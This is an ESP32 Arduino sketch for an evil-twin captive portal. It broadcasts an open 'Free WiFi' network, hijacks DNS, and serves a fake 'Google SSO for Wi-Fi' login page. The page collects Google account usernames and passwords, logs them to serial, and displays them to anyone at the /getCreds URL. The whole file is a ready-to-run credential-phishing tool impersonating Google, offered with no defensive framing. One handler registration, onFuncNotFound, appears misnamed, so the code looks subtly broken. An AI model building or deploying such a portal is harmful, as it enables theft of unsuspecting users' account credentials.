#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* ssid = "Free WiFi";
const char* password = "";

WebServer server(80);
DNSServer dnsServer;

String storedUsername = "";
String storedPassword = "";

void FuncCaptivePortal() {
  server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
  server.send(302, "text/plain", "Redirecting to login...");
}

const char* loginPage = R"rawliteral(
<!DOCTYPE HTML>
<html>
  <head>
    <title>Google SSO for Wi-Fi</title>
    <style>
      body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
      input[type="text"], input[type="password"] { padding: 10px; width: 200px; margin: 10px; }
    </style>
    <script>
      function sendCredentials(event) {
        event.preventDefault();

        let username = document.getElementById("username").value;
        let password = document.getElementById("password").value;

        let xhr = new XMLHttpRequest();
        xhr.open("POST", "/getCreds", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
            console.log("Response:", xhr.responseText);
            document.getElementById("message").innerHTML = "Login Successful!";
          }
        };

        let data = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
        console.log("Sending:", data);
        xhr.send(data);
      }
    </script>
  </head>
  <body>
    <h1>Login to Access Internet</h1>
    <form onsubmit="sendCredentials(event)">
      <input type="text" id="username" name="username" placeholder="Google ID" required><br>
      <input type="password" id="password" name="password" placeholder="Password" required><br>
      <button type="submit" style="border: none; background: none; cursor: pointer;">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdcAAAB1CAIAAACTRTzHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAABpVSURBVHhe7d0LdBPXmQfwmbEkS34QQWgi55CHWHsbE0htF1JLDU2R425R2u0iL7S1D3sWbNKC3ZwmJmlTTNoamSZgky3YzS7YoSes5ZNkLbZpEbtlLbdNKrELsZyStWhgLRpIrYSHXWyst2bv3BkJPY31MBrb38861uhKY4010l+f7twZkQ6XkwAAAJAhFHcOAAAgEyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgkyCFAQAgk2bkG49omuamAABgLiJJkptKWTpTOGb4QiIDAOaGmMmbehynJ4VDozbeNAAAzHahmRtvOlFpSOFg1LITob9vgjQGAMxe4RnLZm7o79CJRKWawhHJywq2oPBlfgAAYPYj8Q8zEchfVmgLc3WCUkrh0MBl0tdPo4UQiUQCQRa3sAAAMOeg4tLr9bndbhR7JJVqEKdnpBqTwH4/uvsciUQoEEAEAwDmMBRxKOhQ3KHQQ9HHVqJJSz6F2TtGvxl+JoVFQmES7wMAADAbobhDocekMJPDDNTI/k5IGmphdK8+vw8RCARcEwAAzAMo9Jjs8/uSCN+glFKYCf8AtCRQCAMA5hUUeij6uBDEuCsSkWQKh94ZmkY1OVoU7jIAAMwbTCkc3jWcaBan2iOB7g9BC+H1erkmAACYN1D0sSmMcE0JSkO/MEL7mR4J7gIAAMwbTI+EP8n8ZaUjhfGuGage5i4CAMC8gaIvxb3TUt06h35zwzTYJgAAmE9Q9KH8QzHITCcVhMmnMAQvAABESCIYU+6RgCgGAAAk2TBMz9Y5AAAAyYEUBgCATIIUBgCATJq1KUzTtMdNOyb9n3zseW/A9U6/+/e/QRP+yx+jRtrjQTfgbgkAADyW5PGFUQZy/LTH63G73ZOTk/L7H+Cunjl+P+1yeT8Y8rz3rvePVu+fhunRa4Tfx2UuSRJUFrXozqz7lwoefEhYulJQ+GlSKCIoKPkBADPC9qcLOTk5IpFIKBCyxxpmcVdPw+xJYXRfTqfvQ9uNg/u9Q3+g3e5bVLvo8UCPS8lnc598iipYQmZnMxkNAABpNW9S2O/3fXTxxqEDnlNmOsEFJiU5os8/llvXQC2+C4piAEB6pZ7CsyCVaI/bZf7dXxq/5Tb9NtEIRmiHw2X8z7Gnn3RbThFwyCEAAM/wPYVpj8d59PWJ3Tv9V6+giphrTQyNZvR/bHe8/hrt9XBtAADAD7xOYVQFO/Q9k0c6acfkLXqBp0ZRwrJV+d/7ESnK5loAAIAfeJzCfr/7f0yO1w7RNya4lmgURQiEpFhC5uYxJ7EEXYzs/BUIBMsezt/5E2rhndAvDADgG76mEk0zm+N++iLtdHAtESiKzM4WrlTkbn06/8d7F7y4H53QRO63vysse4QU4dFpzMA1SvDg8gU7d1N5+RDBqZrrnermXexmlSrdJa4FTMmu24AfsA06O9cCksHTYKKdzslDB/zXrsbsiCCzxdmrVXfsP3yHdp/ka+tFKz8nXPYwOqEJyd9tuGP3Txe8fEhU/igzUq3skQUtLzOjI/g+TM3cgp/PPH1CX9LXFZGkcGnd0VnwcnOebqsoIMmCirbTyYz/mRFOu7mnrWFDxTK0YIyCZaqKuue6DOfHuBuAeYyXKUz7fZds7nfNaIJrCSJJSrow/4cv5n3vR4LCIkIgwDUvLnuZE8VcFAiEn16Wv6Mlv2l3/vPNVG4e7yOY75znTF3n0bmt66iJ/zE8csZoREtpN7aesHJNGTV2oqlCXqCs3t7xptHKPXx2a7+xa2/dE0XFFc/obTByZ37jZQr7HcSVp4UrPiIENBGen9Qd0rznfihaqWC6gFHmxkNRzDBh5WOUdBF0RKROvKpKu0ZGyFQ7NqlkXBt/ydfU1hYSRKFGu66Uawqw91SxtWjLSa5lptl6aoq/1MK8KxBy9dbWbkNfn5E59b7aqEELid4rXq5SbtbZ8I3B/MTHhKLHTxOud3Iev5ijvkTm+AiK65Qgs8VsBDMl8HSwBTJIXZ5ih3GEHunTrpFyLXz2gKbzHE2f6619kGvImMG2mmrcxVRY220bPvazxuq1KtUa5qTZ1NprHe79jgJdaT9S03AIcnj+4mEK0/Tobwm/C4WvaPmVvK8PZ93jZCpiihIpVgtLVk43ggHIsDH9/u1mZkKh7Wmvjt6xVCDX7GnTljCThhe6jLzpxAa3Gf9S2O9mamEC9wiTRFbBRG7VsOih66RYIKnexBwOAoBZ4Xxv12HmXPastnGlGDdFESuqn1IzE/Yu8yBuAfMP/1KY9tA3QjaqkASV55Z85cO8b98vkP9VvL5gP00Yrc7/Gkrg1H/WOTY5J743esxmONBQpVjK9nguVVTU7dKZb7kRzW7s2FalLMLzFCmrtnXg7fU2nQa37MI1XNAlHdufWtUT/nfD2+0ndS2buWEABSvQYuit0x4C4DyxHf+lghb0FhyBu5eCGJ25gQWoCP1Ef5Ibb3Lz9oGWgmo929CkYBviD0oLe1SXKjc0dPTf8jENY7cYDXiiplIZJ4MZ8tX1rXtaW/dslxHxHqwx2/GOhg1KbgUXKSs2t+hO3nJhkpprzKrfVVexgl2Fy4KzmF/AfyTxATwRTwn0NMNd5CCcw+VM4jTpdNxwTE5M3hifmLg2Nmr/5OPhCzbu+D4pclz0/Cbf00eGnYzZvg/bab+Xu00Ur4/+8t6JypcSOK1tnXj7j25u/swzadn1sb57hGuZluG3GuNsL5PXvjrk4G4VafiNWjl3s1DyWl3nDnay2cTdlHWxW4ObNbrwpQu2vzbQtzPWgsiqu6f5vBg9Vo/nUB0c5loCRvW1+BqidN8A1xTg+HUje02rhWthmLnHUmvmGoItUTTdF7mbIKZmrrHd0Mls34uiaDbFe0ijBf9a6F0kzHascU2cFbypc2icu1WkpOZymLUxV6Fqd3f7OjwZ+eQc6V4fsx0bH+rcFOtZxjzNIlfxrIaiDwUgikEUhigSUTCieIwIzKlPvKuFaecwQfu4C0GUkMwtYgrj+Dy+xE4uD2G/nsJe0Twwdryh4m/bmOKiUKPV9Q2NjI6ODg/oW/HGd1vXZlVtT4xtPs6TLTUbuvAVck1z9zHzwIC575hOW73c0VVd14JvkyjTc+qKXUbJem23oW/AMtBn6Naux69Au65xj2FaBbFUqdrEnBtPRNTxY6YTXeyU5TWjhZ0KsJ7uZs5KalS4dzWu8h3sC2ZEx75rBAO6t3oJ2xBK36Cu65pQ1e7v7cMPTu/+WjaezC80dky338BuO8NOlMlj3MX0XDE0VD7RxtTgzJrqs+IVbOltxY+t7XCdaluswRXJzXVBV7uuCReqMtWW9l7jwIClr0/fXr9WYvxBTcNR9kbTZ9NtU9UdRvcjUz3diZdhZMjYid8bbF3VVU3vQC94iIhUnuZp5mph3ydHPf2SyFr4t1L/2O/RldyNoqBauOLFiS/uTuz083ec3PyZl3gtfPlYPVu5lGtNo1wbZ9ykLcdXEWpmtECY4c617FUKrTm8sPMMd28M1EIJ1sJM0XswovQe5golov5YxOLFEYjI8NsHamRMFf7vDHdWMq2yiKWNroUDolI4TKB6ZVK77zLXyHK8vYMd9RZdj8cRqBMJbfjCTd/osa3s6lBo3454BB2mZmZwBaKO/OiQ3FyOvmfZuWTVkYXqaHCu6dfCwwdxZ3f0Xws+M0tap/k48t8crIVvK3qq4prnbL/s6GAql1Lty42KiPFjeYodRzrx68DQ9Gr4tvdBfcdx5rx0T8eO8vDuSoG8urktkKoJ2tTRsaU4/M/J1RvZ/Oy1MHt83JpslVrFnPdazuLLmPOUsQOdrW9t3YrOjLr+kDLObjGeYM5ryiPHBaemtPUVrWoxd4ElfrSqBpfbFostvFSfMed7O17BK7i5rfHRiBUsVuzsZt9NIwdXJDfXFYNuL/630Hr8ZkQ3glSxs43rp5omp7HrBdwlvr6tLeKv5Skad+9g8n6w1XC7hmzzH+9SmBQuitHzQHsJ30TSX/cfE0kSgqzZ2yNhM/bgJ3plfXVEmLIKq2rxB3z7YXPoDmS2Uwb8ob60pjJWciU9CFBeED2QWPqpAnxun+4BKArL1EzS2XvNwY4Hp6mf6XPQrKuprWR6h0P7K5xnTDrmvF61aoqtX0mQF4RHMFZQUITPnSl/lA5sUYwQseXT1q/DK1hV/01FrH9PXrUFd5fbu8zv4wYsubmcFhPb6VO/ThVzQLiEO5+e08YW/K/Ub1QHPlvdJFaoaphzu/FMjH6R+Yl/KSxeSpBZ3IUgv8c/eQ6FMXcxHSiSyBfP2lrYabPiMpAoXxZRugRISxW4srQPWEOGAdjtRnyuKs34Hg0xlCo1zMvWcnwg8AK1mA+jF7RKvUomXa1m8uPNXmPg3+E6hdcry2Imx+zmtJ1j15RiWazthIh0RWAFn7v5xpTUXMTYFfbxVpUWp+GhtFnZATYa5YpYf00sWYjPjRfD3nXmM/71SAilhOhubhrzE6SDJt61n/LHP8QwStMCKXXPwhinAim5KDfGLnQohRflzdoUvmLnXjf3RlcbHEke+xqwjVzB54zgJqOFkvSWj2lSWo7rpBMWbojbSWM7eqlWVqtQpixWqpheSL3xFHudbQAPHVNVKuI+BLwQdVDAJZqu0RBnOmP1Ao3ZL+DzSnnc/04s4VawfQSfI8nNRdjOswP4pGl5VgTe6fU1cq7MD6dswlcTZ29X3w7v8S+FSSGZW8xNM9Uvedkvbh4vffZDx7nrF+MFMUURR74l6f52jNORb+X8w+qs6BjOooh77pi1KRwgvfXLZsQZ0iEg5mX4BolXq/HQsw7jKeaDv8Xci16opWvLcL0vU61j8qrrhImJYa5TWFW9Js6HgQyTFZeySWgeiuwWF0vDTPlxP+/WnQEj0X0kCc4lFvD7jWyu418KUyIyfyW7YChx/9e76Hvjin5XwQ2f71Wr3uVzs7eaPreX/v0H/ujwvjOfkEmjuj5mi8UyNnv0F+LWE44JtmZUhtRFMq5zM7pA4wlxmYrZCkd0n7SgEDa+hn6X1qzhurBlq9TMJsdXDCiGuU7hEnVZnI/eGSdfXoXPjYZTSdR8Uhm7x/PR+AWj08Gt4AfY/nckubmIggeU3FQ6ju4mzmPXV33vRa7cj+0g7n4CfExhgiQXPkZT2V6C+pXr/sbr5Wc9C/wEiargt//87qlP3vf6o0YTx4fS98NrvvcvxaihH38oSySYtbWwWF6MB2kRbw/F2cYxZjHjD4aysPGqsgfYj7/RBRpPSMtWM0toR//X+QHDYPhY4EKVhtnEz1TKbKewTKNM7/CINJKuVrNjRPRHjiW+HUosL8L9t4Qx3poaOxNcwcE0S24uQnYv++lTP3Au5W2P6O2nkM1066iTq/bj4PfnstuIhylMoFp4fMEX/unGZ/ZMlIz5hSiC2Xanz/XjU+1m++A0g5iJ4Ku+n/zS5YgqoPPEhKpYmDWLOyTkZWtx/pzo0MfcjyB4EINNitCckq9gY8vYcTRiBwiMBwe65carnTB0HNShvAjPWblqHXNld3+XEXcKp3uMWlpJ1bX78Ejb401NsXafmZp8lXqqNUXYeg/hcQ2yWkXIHivJzUUsV7JvGG09sXexSeijk7RUid/q4y0DiMTHFCYoyWX5gV95/tpNUxEHGB5zjf/oVLvJPujwuqbYWEcTtMfvvTzu3XvcefEq1xhEksSnC6jF+dSsPuxl6UYt3mvDsn1riznipTNh7WpuwiOW1NrNqrCSo0RTj0eMWp6rbzkZXvh4bboXGrnjLGQQN15N37aXCeGGysAuA5h8TTWKYfthbSvTKZz4GDUBd3vHbXm/Kd3ShndSsOuqaxqOxgziMcub3SZuOlxJrRbvf8GsqXciVrDTeqipCY/7VjfXhq3g5OaSqjTP49L4cH195BvGmHlXY2J7VC7R1OO/hpah6URUqntt+qeUSzd3Tf8YI3MeL1OYpO7LX/K5u0vJqGP3oHgddV3/vrkNZfEHf7mAimI/7UdxzEIT6KKP9k94HLoPjj351i+G/uyODmtUAq9/RCAW8jKDvY7RsSmE5OZiddP+aubJfrJJuaqqpcdotaMb2CxHO+oql9UdQaWirFrXHnU8BHlNsxYHm7lJsaxql85w0modNBp6WmpKlTXMXBlXqqoOVrg1YSUbUqiqrmQ2wzMLukmlTHBglayojP3TXXta9P1GY7/BMqNfMZen2NHTjVeSuUOzdKm6oeMoulOLZZC5a92B7TUrisueMTD/S7l2+1dxDt4kVf+gg523aXUZWlPGs3gFD+o7NquWPckcWEe2sbt9S8TGyeTmEqu2sXOhNwxlxZMd+n6L9azZeLSjQV2mfCH80E63Jlb9QI/ffswtXypm/tpJ/Ny0W409LVXFS6sOmG3HjRZI4aCIfemmeZrBo/lgfr//wvWP/uaturLXq0pf10SfPvtGVfm/faPhd9qeDwymEcvgZevglbP//fF7v7rwG+3pf378F5tXvvH3Za+vf6Rz3xf2fBi613LFixMtv5z0xt0XOlMCezBPLXpX0eSO5vNWfViFyZFVP9/IdismvAdzxO1Z8fckvgWzlvufnu2L/hcG9nEZHbkwQVPd70hvcC9tLPQ2Ux5/Z8oj10ztsok9hkMcsuItnUPxdvK+nUfzsbTG2MuCIBTP7+AOpxT5v0/5mFw2aSPfVwIKNe2W6R8Wie/m7B7MJEnemyf7ftkWSeAjZARU4bp8brN98OX3fr7dtPc7b7d853faZ955adepV/59uO+a8y+oIqYJnyfPfKPgRa/oAjPsGPdFLMwh/vFRETWb+yJCyb/a2ndmoHdPvaace53LyzX1e7pNI8OdmyJ2Kb5J/tV200hf+1aNgq2UCxWare3Hzlm7t/FjB4gSBR42TNSvLov+F0rX1OAYZnblwA0JkWl+Zux+Vl2MZ5WXq6S34TsDFisa3xgesfSiB1y1PLDMsmJVZW3jq70DF21DB2vj7i3xgLr119YBfWv9egW3gpmV1dptHhl+tbY4j22KktRc4pLGY9ah3uZabiHREm7SollMu5+Y4j0krsWKHW/ZRoydjZtU7KONHm9FZa1WZxqx9taXxHtuzkckSmJuMhHcuwDipz1ej9vtnpyclN8f/XUCKXH7Pa+fO35o6M0JzyTXlAyK9C4UX/ua6Iby7nzRc0+ISu8Tzuoe4Rl0QVclr9GjavC14d6Nybz0wFxkbiKVTNfwThMdPLIPCLD96UJOTo5IJBIKhCTF7pnC4K6eBp7WwiwRJfxGkXrLsvU5Agk55WEtp+SnBddcd/2r6O7/2PZ41mfuhQgmwvqXQ4xZjHjrnKysCCJ43nGOxempHTThLb2EphieFTOC1ymMCCnB14vWaj/31KckC6kpvnQ5PhS56P3p3vzFL32l5PNFoiy+/8czznmyRV1c1XY66iU3ZmxtxsOYShpucbheMPdc0NUWq2MM5PDaunZvxyPONFWrk+gCArc2CzIJVcRfuGflv3zxx4/ds0osSPh75yQCyZfvexTN/vCdD2YlleNzi91wsN1sN2xfFbLx+oLF0NNStaqihRl6LKtvro95PC4wh1nebNfZ8UCODS264xYbHtJgPtpR9yVl3ZvMDRT7mmIdER+kAa/7hUOhu3L6XLbrH/30D0f+cPWPbr8HtXDXxUKSZDYlLPnUsu8+vPG+/ILsLFEKfRpzjM3wTF3tyzG/AExRr+9uXwcfPOchp+VATdVT+lijmmXqfYbup0t5seWWf1LvF541Kczy036Xz20dHT79yftDo/9nu37pqnMMD4dgEhnlLKp2F4mlSxcseWhR4cq7lj8oXZqdJUyuK2Nuc14y6w93dRmMxpPM605erlFrqmo2VvP8AGVgZl2xGno6uo4aTf1WZmTxctUTa6s1T1apCyGB45p3KRzE7h3n9fuuuyc+mvjkunsc/f/5wrwluXfli/IEFIpeARS/AICZNn9TGAAA+GCOj1QDAIA5D1IYAAAyCVIYAAAyCVIYAAAyCVIYAAAyCVIYAAAyCVIYAAAyCVIYAAAyCVIYAAAyCVIYAAAyCVIYAAAyKeUUhgPmAAAAkmwYJp/CCR2uAgAA5oMkgjGlWpi9P5I5h0gGAMxHKPpwAOIwTCoI09EvzN4vSfr9zLfNAwDAPMGEHpu8ycQvJz1b55i3ApK8ceMGdxkAAOYBFHps+nGXk5JqCgeXAP2+fPUKlMMAgHkCxR0KvWAAshNJSDKFQ++PvXvE7XZ/cP7c1WvXfD4fdx0AAMw5KOJQ0KG4Q6HHxV94JHJT05PkNx4hNP4KZPQbLRBaFKfTOYmhEn18fPz69esuh9PrD4njqb4xGQAA+CokVAVUVrZEvGDBgvz8/Nzc3BxMLBaLRKKsrCw2fzOQwqgs93q8LrfL4XBwQTw+MTF5w+Vy+aOLYshiAMBsERWnVFZWdnZ2Xk5ubn4eG8ESiSRblC0QCiiK+dY5dJvbl8IIG8QohRFUDqPYRUGMimKng/nxer0ooSF1AQBzAwpXkqIEAoFEzPwgTARnZ6NCGEUwwtwmwQhG0pDC6DeCMtfjZn4QdOb1oR/vzQhmb8lOAwDALMFlaiBb0VkWiuEsgVAkROGLfqEf1IDCl83f253CCBvEqBZGEz4MxTH6jVq4qyF6AQBzAhOwOGRR2ZuVhdMYQ8mbdCGMpJrCCBu0TN5iKILRRS6FgyCLAQCzV3i6spnL5i8LXWR/JyENKYyg8A1OcNP4l5+G4cMAgLmDIvHoXpy3wfxlp9mJJKQnhVnBLA4VsxEAAGadmFGbSv6y0pnCQZC8AIC5LfXwDZqRFAYAADBNSe7BDAAAIC0ghQEAIJMghQEAIJMghQEAIJMghQEAIJMghQEAIJMghQEAIJMghQEAIJMghQEAIJMghQEAIJMghQEAIHMI4v8BrJjTlJwXzi4AAAAASUVORK5CYII=" 
            width="200">
        </button>
    </form>
    <p id="message"></p>
  </body>
</html>
)rawliteral";

void FuncHandleRoot() {
  server.send(200, "text/html", loginPage);
}

void FuncPostCreds() {
  Serial.println("Received a POST request at /getCreds");

  if (server.hasArg("username") && server.hasArg("password")) {
    storedUsername = server.arg("username");
    storedPassword = server.arg("password");

    Serial.println("Credentials Stored:");
    Serial.println("Username: " + storedUsername);
    Serial.println("Password: " + storedPassword);

    server.send(200, "text/plain", "Credentials received!");
    return;
  }

  Serial.println("Error: Missing credentials.");
  server.send(400, "text/plain", "Error: Missing credentials.");
}

void FuncGetCreds() {
  String response = "<html><head><title>Stored Credentials</title></head><body>";
  response += "<h2>Stored Credentials</h2>";
  response += "<p><strong>Username:</strong> " + storedUsername + "</p>";
  response += "<p><strong>Password:</strong> " + storedPassword + "</p>";
  response += "<a href='/'>Go Back</a>";
  response += "</body></html>";

  server.send(200, "text/html", response);
}

void FuncNotFound() {
  Serial.println("Client requested: " + server.uri());
  server.send(404, "text/plain", "404: Not Found");
}

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  Serial.println("Access Point Started");
  Serial.println("IP Address: " + WiFi.softAPIP().toString());

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", FuncHandleRoot);
  server.on("/getCreds", HTTP_POST, FuncPostCreds); // Store credentials
  server.on("/getCreds", HTTP_GET, FuncGetCreds);   // Display credentials
  server.onFuncNotFound(FuncCaptivePortal);

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
